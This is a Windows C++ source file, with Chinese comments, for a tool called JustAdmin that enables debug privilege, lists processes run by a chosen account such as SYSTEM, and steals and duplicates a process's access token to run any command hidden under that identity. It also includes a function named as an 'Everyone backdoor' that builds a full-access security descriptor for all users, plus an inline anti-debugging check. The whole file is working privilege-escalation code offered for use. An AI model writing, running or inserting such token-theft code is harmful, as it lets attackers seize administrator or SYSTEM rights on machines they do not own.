// JustAdmin.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <iostream>
#include <Windows.h>
#include <Tlhelp32.h>
#include <WtsApi32.h>
#include <sddl.h>
#include <tchar.h>
#include <Aclapi.h>
#pragma comment( lib, "Wtsapi32.lib" )

#define PIPE_BUFFER 256

/////////////////////////////////////////////
// 获取用户SID
PSID GetUserSID(LPCWSTR UserName);
//////////////////////////////////////////////

/////////////////////////////////////////////
// 根据SID获取具有Debug权限的进程句柄
// BOOL GetProcessTokenViaSID(SID UserSID, PHANDLE hToken);
/////////////////////////////////////////////

/////////////////////////////////////////////
// 提升当前进程权限
BOOL EnablePrivilegeDebug();
/////////////////////////////////////////////

////////////////////////////////////////////
// 获取进程Token
HANDLE GetTokenViaProcessID(DWORD ProcessID);
///////////////////////////////////////////

// 为内核对象添加ACL
DWORD AddAceToObjectsSecurityDescriptor(
	LPTSTR pszObjName,          // name of object
	SE_OBJECT_TYPE ObjectType,  // type of object
	LPTSTR pszTrustee,          // trustee for new ACE
	TRUSTEE_FORM TrusteeForm,   // format of trustee structure
	DWORD dwAccessRights,       // access mask for new ACE
	ACCESS_MODE AccessMode,     // type of ACE
	DWORD dwInheritance         // inheritance flags for new ACE
);

// 为文件对象添加ACL
DWORD AddAceToObjectsSecurityDescriptorByHandle(
	HANDLE handle,          // handle to the object from which to retrieve security information
	LPTSTR pszTrustee,          // trustee for new ACE
	TRUSTEE_FORM TrusteeForm,   // format of trustee structure
	DWORD dwAccessRights,       // access mask for new ACE
	ACCESS_MODE AccessMode,     // type of ACE
	DWORD dwInheritance         // inheritance flags for new ACE
);

////////////////////////////////////////////
// 模拟进程并执行命令
BOOL ImpersonatedProcessToRunCommand(HANDLE hToken, LPWSTR Oommand);
///////////////////////////////////////////
DWORD ForeachProcess(PSID pFilterSID);
// 创建EveryOne后门
BOOL SetEveryOneDoor(PSECURITY_DESCRIPTOR pSD);


DWORD ForeachProcess(PSID pFilterSID) {
	PROCESSENTRY32 pe32;
	HANDLE hToken = NULL;
	HANDLE hProcess = NULL;
	LPVOID pSidOwner = NULL;
	DWORD dwTokenWonerSize = NULL;
	PSECURITY_DESCRIPTOR psi = NULL;
	BOOL bMore = FALSE;
	PTOKEN_OWNER SidOwner = NULL;
	DWORD dwRet = NULL;
	HANDLE hProcessSanp = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (hProcessSanp == INVALID_HANDLE_VALUE)
	{
		printf("Error Get the Process SnapShot\n");
		return -1;
	}
	bMore = Process32First(hProcessSanp, &pe32);
	while (bMore)
	{
#ifdef _DEBUG
		wprintf(TEXT("Process Name: %s\t\tProcess ID: %d \n"), pe32.szExeFile, pe32.th32ProcessID);
#endif // _DEBUG
		
		//////////////////////////////////////////////////////////////////////////////////////////
		hProcess = OpenProcess(TOKEN_QUERY, FALSE, pe32.th32ProcessID);
		if (hProcess == NULL) {
			bMore = Process32Next(hProcessSanp, &pe32);
			continue;
		}
		/////////////////////////////////////////////////////////////////////////////////////////

		// 获取进程访问令牌
		hToken = GetTokenViaProcessID(pe32.th32ProcessID);
		if (hToken == NULL) {
			// 获取失败则继续检索下一个进程
#ifdef _DEBUG
			wprintf(TEXT("CheckTokenViaProcessID Error : %d \n"), GetLastError());
#endif // _DEBUG
			bMore = Process32Next(hProcessSanp, &pe32);
			continue;
		}

		// 第一次获取令牌信息所需要的内存空间大小
		dwRet = GetTokenInformation(hToken, TokenOwner, NULL, NULL, &dwTokenWonerSize);
		// 如果获取SID失败则继续检索下一个进程
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
#ifdef _DEBUG
			wprintf(TEXT("GetTokenInformation Error : %d \n"), GetLastError());
#endif // _DEBUG
			if (pSidOwner)
				HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pSidOwner);
			if (hToken)
				CloseHandle(hToken);
			if (hProcess)
				CloseHandle(hProcess);
			bMore = Process32Next(hProcessSanp, &pe32);
			continue;
		}

		// 如果缓冲区太小，则重新分配
		pSidOwner = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTokenWonerSize);
		dwRet = GetTokenInformation(hToken, TokenOwner, pSidOwner, dwTokenWonerSize, &dwTokenWonerSize);
		if (dwRet == NULL) {
#ifdef _DEBUG
			wprintf(TEXT("HeapAlloc GetTokenInformation Error : %d \n"), GetLastError());
#endif // _DEBUG
			if (pSidOwner)
				HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pSidOwner);
			if (hToken)
				CloseHandle(hToken);
			if (hProcess)
				CloseHandle(hProcess);
			bMore = Process32Next(hProcessSanp, &pe32);
			continue;
		}
		SidOwner = (PTOKEN_OWNER)pSidOwner;
		/*if (CheckTokenViaProcessID(pe32.th32ProcessID, &hToken)) {
			wprintf(TEXT("[+]ProcessId : %d , ProcessName : %s \n"), pe32.th32ProcessID, pe32.szExeFile);
		}*/
		LPWSTR pszTmpSID = NULL, pszUserSID = NULL;
		ConvertSidToStringSid(SidOwner->Owner, &pszTmpSID);
		ConvertSidToStringSid(pFilterSID, &pszUserSID);
		// wprintf(TEXT("[+]PSID : %s , USID : %s \n"), pszTmpSID, pszUserSID);
		if (EqualSid(SidOwner->Owner, pFilterSID)) {
			wprintf(TEXT("[+]ProcessId : %d , ProcessName : %s \n"), pe32.th32ProcessID, pe32.szExeFile);
		}

		/*if (pSidOwner)
			HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pSidOwner);
		if (hToken)
			CloseHandle(hToken);
		if (hProcess)
			CloseHandle(hProcess);*/
		bMore = Process32Next(hProcessSanp, &pe32);
	}
	CloseHandle(hProcessSanp);
	return 0;
}

BOOL SetEveryOneDoor(PSECURITY_DESCRIPTOR pSD)
{
	DWORD dwRes = NULL;
	PSID pEveryoneSID = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS ea[1];
	PACL pACL = NULL;
	// 初始化Everyone的SID
	AllocateAndInitializeSid(&SIDAuthWorld, 1,SECURITY_WORLD_RID,0, 0, 0, 0, 0, 0, 0,&pEveryoneSID);
	
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));

	ea[0].grfAccessPermissions = GENERIC_ALL;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPTSTR)pEveryoneSID;
	dwRes = SetEntriesInAcl(2, ea, NULL, &pACL);
	pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(pSD,SECURITY_DESCRIPTOR_REVISION);
	if (!SetSecurityDescriptorDacl(pSD,
		TRUE,     // bDaclPresent flag   
		pACL,
		FALSE)) {
		return FALSE;
	}
	return TRUE;
}

PSID GetUserSID(LPCWSTR UserName) {
	PSID UserSID = NULL;
	SID_NAME_USE sNameUse = { SidTypeUser };
	DWORD dwDomainSize = 0;
	DWORD cbSID = 0;
	BOOL bRet = LookupAccountNameW(
		NULL,
		UserName,
		NULL,
		&cbSID,
		NULL,
		&dwDomainSize,
		&sNameUse
	);
#ifdef _DEBUG
	wprintf(TEXT("GetLastError : %d, Need Size : %d  \n"), GetLastError(), dwDomainSize);
#endif // _DEBUG
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
		LPWSTR pszSID = NULL;
		LPWSTR pszDomain = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDomainSize * sizeof(TCHAR));
		UserSID = (PSID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbSID);
		bRet = LookupAccountName(
			NULL,
			UserName,
			UserSID,
			&cbSID,
			pszDomain,
			&dwDomainSize,
			&sNameUse
		);
		ConvertSidToStringSid(UserSID, &pszSID);
		wprintf(TEXT("[+]%s\\%s SID: %s \n"), pszDomain, UserName, pszSID);
		LocalFree(pszSID);
#ifdef _DEBUG
		LPWSTR wsSID = NULL;
		ConvertSidToStringSid(UserSID, &wsSID);
		wprintf(TEXT("Domain : %s , Username : %s , SID : %s \n"), pszDomain, UserName, wsSID);
		LocalFree(wsSID);
#endif // _DEBUG
	}
	return UserSID;
}

BOOL EnablePrivilegeDebug()
{
	BOOL bREt = FALSE;
	HANDLE hToken;
	HANDLE hProcess = GetCurrentProcess(); // 获取当前进程句柄
	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		TOKEN_PRIVILEGES tkp;
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid))
		{
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			//通知系统修改进程权限
			bREt = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
		}
		CloseHandle(hToken);
	}

	return bREt!=0?TRUE:FALSE;
}

HANDLE GetTokenViaProcessID(DWORD ProcessID)
{
	HANDLE hToken = NULL;
	HANDLE hProcess = NULL;
	BOOL bRet = FALSE;
	// 获取进程句柄
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, true, ProcessID);
	if (hProcess == NULL) {
		wprintf(TEXT("GetProcess Token Error : %d \n"), GetLastError());
		return NULL;
	}
	
	//////////////////////////////////////////////////////////////
	// 尝试获取进程令牌
	//////////////////////////////////////////////////////////////
	bRet = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken);
	if (bRet == 0) {
#ifdef _DEBUG
		wprintf(TEXT("GetProcess Token Error : %d \n"), GetLastError());
#endif
		if (hProcess)
			CloseHandle(hProcess);
		return NULL;
	}
#ifdef _DEBUG
	wprintf(TEXT("GetProcess Token : %d \n"), ProcessID);
#endif
	if (hProcess)
		CloseHandle(hProcess);
	return hToken;
}

BOOL ImpersonatedProcessToRunCommand(HANDLE hToken, LPWSTR Oommand)
{
	HANDLE duplicateTokenHandle = NULL;
	CHAR szBuf[PIPE_BUFFER] = { 0 };
	DWORD dwRead = 0;
	SECURITY_ATTRIBUTES sa;
	HANDLE hRead = NULL, hWrite = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return FALSE;
	}
	BOOL bImperson = ImpersonateLoggedOnUser(hToken);
	if (bImperson == NULL) {
		wprintf(TEXT("ImpersonateLoggedOnUser Error : %d \n"), GetLastError());
		return FALSE;
	}

	/////////////////////////////////////////////////////////////
	// 复制令牌
	BOOL duplicateToken = DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (duplicateToken == NULL) {
		return FALSE;
	}
	//////////////////////////////////////////////////////////////

	startupInfo.hStdError = hWrite;
	startupInfo.hStdInput = hRead;
	startupInfo.hStdOutput = hWrite;
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
	startupInfo.wShowWindow = SW_HIDE; // 隐藏窗口
	startupInfo.cb = sizeof(STARTUPINFO);
	/*
	AddAceToObjectsSecurityDescriptorByHandle(
		duplicateTokenHandle,

		)
	*/
	BOOL bCreate = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL , Oommand, 0, NULL, NULL, &startupInfo, &processInformation);
	if (bCreate == NULL) {
		wprintf(TEXT("CreateProcessWithToken Error : %d \n"),GetLastError());
		return FALSE;
	}
	CloseHandle(hWrite);
	while (ReadFile(hRead, szBuf, PIPE_BUFFER - 1, &dwRead, NULL))
	{
		printf("%s", szBuf);
		ZeroMemory(szBuf, PIPE_BUFFER);
	}
	CloseHandle(hRead);
	return TRUE;
}

DWORD AddAceToObjectsSecurityDescriptor(
	LPTSTR pszObjName,          // name of object
	SE_OBJECT_TYPE ObjectType,  // type of object
	LPTSTR pszTrustee,          // trustee for new ACE
	TRUSTEE_FORM TrusteeForm,   // format of trustee structure
	DWORD dwAccessRights,       // access mask for new ACE
	ACCESS_MODE AccessMode,     // type of ACE
	DWORD dwInheritance         // inheritance flags for new ACE
)
{
	DWORD dwRes = 0;
	PACL pOldDACL = NULL, pNewDACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;
	EXPLICIT_ACCESS ea;

	if (NULL == pszObjName)
		return ERROR_INVALID_PARAMETER;

	// Get a pointer to the existing DACL.

	dwRes = GetNamedSecurityInfo(pszObjName, ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL, NULL, &pOldDACL, NULL, &pSD);
	if (ERROR_SUCCESS != dwRes) {
		printf("GetNamedSecurityInfo Error %u\n", dwRes);
		goto Cleanup;
	}

	// Initialize an EXPLICIT_ACCESS structure for the new ACE. 

	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = dwAccessRights;
	ea.grfAccessMode = AccessMode;
	ea.grfInheritance = dwInheritance;
	ea.Trustee.TrusteeForm = TrusteeForm;
	ea.Trustee.ptstrName = pszTrustee;

	// Create a new ACL that merges the new ACE
	// into the existing DACL.

	dwRes = SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);
	if (ERROR_SUCCESS != dwRes) {
		printf("SetEntriesInAcl Error %u\n", dwRes);
		goto Cleanup;
	}

	// Attach the new ACL as the object's DACL.

	dwRes = SetNamedSecurityInfo(pszObjName, ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL, NULL, pNewDACL, NULL);
	if (ERROR_SUCCESS != dwRes) {
		printf("SetNamedSecurityInfo Error %u\n", dwRes);
		goto Cleanup;
	}

Cleanup:

	if (pSD != NULL)
		LocalFree((HLOCAL)pSD);
	if (pNewDACL != NULL)
		LocalFree((HLOCAL)pNewDACL);

	return dwRes;
}

DWORD AddAceToObjectsSecurityDescriptorByHandle(
	HANDLE handle,				// name of object
	LPTSTR pszTrustee,          // trustee for new ACE
	TRUSTEE_FORM TrusteeForm,   // format of trustee structure
	DWORD dwAccessRights,       // access mask for new ACE
	ACCESS_MODE AccessMode,     // type of ACE
	DWORD dwInheritance         // inheritance flags for new ACE
) {

	DWORD dwRes = 0;
	PACL pOldDACL = NULL, pNewDACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;
	EXPLICIT_ACCESS ea; // 策略
	SE_OBJECT_TYPE ObjectType = SE_KERNEL_OBJECT;
	if (NULL == handle)
		return ERROR_INVALID_PARAMETER;

	// Get a pointer to the existing DACL.

	dwRes = GetSecurityInfo(handle, ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL, NULL, &pOldDACL, NULL, &pSD);
	if (ERROR_SUCCESS != dwRes) {
		printf("GetSecurityInfo Error %u\n", dwRes);
		goto Cleanup;
	}

	// Initialize an EXPLICIT_ACCESS structure for the new ACE. 

	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = GENERIC_ALL;
	ea.grfAccessMode = GRANT_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TrusteeForm;
	ea.Trustee.ptstrName = pszTrustee;

	// Create a new ACL that merges the new ACE
	// into the existing DACL.

	dwRes = SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);
	if (ERROR_SUCCESS != dwRes) {
		printf("SetEntriesInAcl Error %u\n", dwRes);
		goto Cleanup;
	}

	// Attach the new ACL as the object's DACL.

	dwRes = SetSecurityInfo(handle, ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL, NULL, pNewDACL, NULL);
	if (ERROR_SUCCESS != dwRes) {
		printf("SetSecurityInfo Error %u\n", dwRes);
		goto Cleanup;
	}

Cleanup:

	if (pSD != NULL)
		LocalFree((HLOCAL)pSD);
	if (pNewDACL != NULL)
		LocalFree((HLOCAL)pNewDACL);

	return dwRes;

}
int wmain(int argc, _TCHAR* argv[])
{
	if (!EnablePrivilegeDebug()) {
		wprintf(TEXT("[+]Can't Modify Process Token, Error : %d \n"), GetLastError());
		return -1;
	}

	DWORD dwIsDebug = 10;
	__asm {
		mov         eax, dword ptr fs : [00000030h] 
		movzx       eax, byte ptr[eax + 2]
		mov         dwIsDebug, eax
	}
	

	HANDLE hToken = NULL;
	DWORD dwProcessID = 0;
	PSID systemSID = NULL;
	LPWSTR pszSID = NULL;
	LPWSTR pszDomain = NULL;
	BOOL bRet = FALSE;

	if (!EnablePrivilegeDebug()) {
		wprintf(TEXT("[+]Can't Modify Process Token, Error : %d \n"), GetLastError());
		return -1;
	}
	///////////////////////////////////////////////////////////
	// 解析输入参数
	///////////////////////////////////////////////////////////
	if (argc < 2) {
		wprintf(TEXT("[+]Usage : %s <User> <PID> <Command>\n"), argv[0]);
		return 0;
	}

	if (argc == 2) {
		// 列出可复制令牌的进程列表
		systemSID = GetUserSID(argv[1]);
		if (systemSID == NULL) {
			wprintf(TEXT("[+]Can't Find User : %s \n"), argv[1]);
			return -1;
		}
		ConvertSidToStringSid(systemSID, &pszSID);
		wprintf(TEXT("[+]SID: %s \n"), pszSID);
		LocalFree(pszSID);
		ForeachProcess(systemSID);
		return 0;
	}else if(argc == 4){
		systemSID = GetUserSID(argv[1]); // 获取用户的SID
		dwProcessID = _wtoi(argv[2]);
		LPWSTR Command = argv[3];
		hToken = GetTokenViaProcessID(dwProcessID);
		if (hToken != NULL) {
			ImpersonatedProcessToRunCommand(hToken, Command);
		}
		return 0;
	}
	
	wprintf(TEXT("[+]Usage : %s <User> <PID> <Command>\n"), argv[0]);

#ifdef _DEBUG
	wprintf(TEXT("GetLastError : %d \n"), GetLastError());
#endif // _DEBUG
	

}
